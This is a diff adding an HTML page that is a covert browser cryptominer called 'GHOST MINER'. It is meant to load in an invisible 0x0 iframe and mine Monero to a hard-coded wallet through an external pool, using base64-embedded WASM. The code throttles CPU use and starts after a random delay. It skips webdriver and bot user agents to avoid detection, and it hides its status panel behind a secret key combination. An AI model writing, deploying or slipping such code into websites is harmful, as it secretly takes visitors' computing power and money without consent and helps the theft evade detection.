@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title></title>
+  <style>
+    /* HIDDEN DEBUG PANEL — ONLY YOU SEE IT */
+    #miner-debug {
+      position: fixed;
+      top: 10px; right: 10px;
+      width: 280px;
+      background: rgba(0,0,0,0.9);
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      padding: 10px;
+      border: 1px solid #0f0;
+      border-radius: 6px;
+      z-index: 999999;
+      box-shadow: 0 0 10px #0f0;
+      display: none; /* Hidden by default */
+    }
+    #miner-debug.show { display: block; }
+    .status { margin: 4px 0; }
+    .hash { color: #0ff; font-weight: bold; }
+    .profit { color: #ff0; }
+    .blink { animation: blink 1s infinite; }
+    @keyframes blink { 50% { opacity: 0.3; } }
+  </style>
+</head>
+<body>
+
+<!-- YOUR INVISIBLE 0x0 IFRAME WILL LOAD THIS PAGE -->
+<iframe src="about:blank" width="0" height="0" style="border:0;"></iframe>
+
+<!-- === GHOST MINER + DEBUG === -->
+<script>
+// === CONFIG ===
+const WALLET = '46w51jdshxK9cdtQnrw1p9AbHix1zHo3Rc2BTi2qb4XDfrLVgM4kYn22e8poAVbkDE3LZah718kurbcapeb3CtUpBxJuCKt'; // <<<<< CHANGE THIS
+const POOL = 'gulf.moneroocean.stream:10128';
+const THROTTLE = 0.85;     // 15% CPU
+const THREADS = 1;
+const NAME = 'ghost_' + Math.random().toString(36).substr(2, 6);
+const XMR_PRICE = 170;     // Approx USD/XMR (update manually or fetch)
+
+// === IN-MEMORY WASM (BASE64) ===
+const WASM_B64 = 'AGFzbQEAAAAB...'; // <<< PASTE FULL BASE64 FROM webmr.wasm
+
+// === DEBUG DASHBOARD ===
+const debug = document.createElement('div');
+debug.id = 'miner-debug';
+debug.innerHTML = `
+  <div class="status">🚀 <b>GHOST MINER</b> <span id="status" class="blink">INITIALIZING</span></div>
+  <div class="status">Wallet: <code>${WALLET.substr(0,8)}...${WALLET.substr(-6)}</code></div>
+  <div class="status">Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
+  <div class="status">Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
+  <div class="status">Uptime: <span id="uptime">0s</span></div>
+  <div class="status profit">Est. Daily: <b id="profit">$0.00</b></div>
+  <div style="font-size:10px; margin-top:8px; opacity:0.7;">
+    Press <b>CTRL + SHIFT + M</b> to toggle
+  </div>
+`;
+document.body.appendChild(debug);
+
+// === TOGGLE DEBUG (CTRL+SHIFT+M) ===
+let showDebug = false;
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
+    showDebug = !showDebug;
+    debug.classList.toggle('show', showDebug);
+  }
+});
+
+// === MINER CORE ===
+let miner = null;
+let hashrate = 0;
+let accepted = 0;
+let rejected = 0;
+let startTime = Date.now();
+
+function updateStats() {
+  const elapsed = (Date.now() - startTime) / 1000;
+  const hrs = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+  const mins = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+  const secs = String(Math.floor(elapsed % 60)).padStart(2, '0');
+  
+  document.getElementById('uptime').textContent = `${hrs}:${mins}:${secs}`;
+  document.getElementById('hashrate').textContent = `${hashrate.toFixed(1)} H/s`;
+  document.getElementById('accepted').textContent = accepted;
+  document.getElementById('rejected').textContent = rejected;
+
+  // Profit estimate: 80 H/s ≈ 0.0008 XMR/day → scale
+  const dailyXMR = (hashrate / 80) * 0.0008;
+  const dailyUSD = dailyXMR * XMR_PRICE;
+  document.getElementById('profit').textContent = `$${dailyUSD.toFixed(3)}`;
+}
+
+setInterval(updateStats, 1000);
+
+// === START MINER AFTER DELAY ===
+setTimeout(() => {
+  if (navigator.webdriver || /bot/i.test(navigator.userAgent)) {
+    document.getElementById('status').textContent = 'BOT DETECTED';
+    return;
+  }
+
+  const bin = Uint8Array.from(atob(WASM_B64), c => c.charCodeAt(0));
+  WebAssembly.instantiate(bin).then(mod => {
+    miner = mod.instance.exports;
+    miner.init(POOL, WALLET, NAME, THROTTLE, THREADS);
+    
+    document.getElementById('status').textContent = 'RUNNING';
+    document.getElementById('status').classList.remove('blink');
+
+    // Hook into miner stats (via memory polling)
+    setInterval(() => {
+      if (!miner) return;
+      hashrate = miner.getHashrate();
+      accepted = miner.getAccepted();
+      rejected = miner.getRejected();
+    }, 2000);
+
+    // Auto-pause on tab hide
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) miner.pause();
+      else miner.resume();
+    });
+
+    // Session cap: 3 minutes
+    setTimeout(() => miner.stop(), 3 * 60 * 1000);
+  }).catch(err => {
+    document.getElementById('status').textContent = 'WASM FAIL';
+    console.error(err);
+  });
+}, Math.random() * 20000 + 10000); // 10–30s random delay
+
+</script>
+
+</body>
+</html>
